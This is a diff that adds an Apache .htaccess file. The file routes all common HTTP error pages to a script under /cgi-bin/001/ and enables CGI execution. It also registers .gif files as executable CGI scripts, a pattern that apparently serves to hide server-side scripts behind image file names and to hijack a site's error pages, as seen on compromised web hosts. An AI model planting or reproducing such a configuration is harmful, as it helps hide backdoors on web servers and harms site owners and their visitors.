@@ -1,0 +1,11 @@
+DirectoryIndex index.shtml index.cgi
+
+ErrorDocument 404 /cgi-bin/001/index.cgi
+ErrorDocument 403 /cgi-bin/001/index.cgi
+ErrorDocument 402 /cgi-bin/001/index.cgi
+ErrorDocument 400 /cgi-bin/001/index.cgi
+ErrorDocument 401 /cgi-bin/001/index.cgi
+ErrorDocument 500 /cgi-bin/001/index.cgi
+
+Options +ExecCGI
+AddHandler cgi-script .cgi .pl .gif
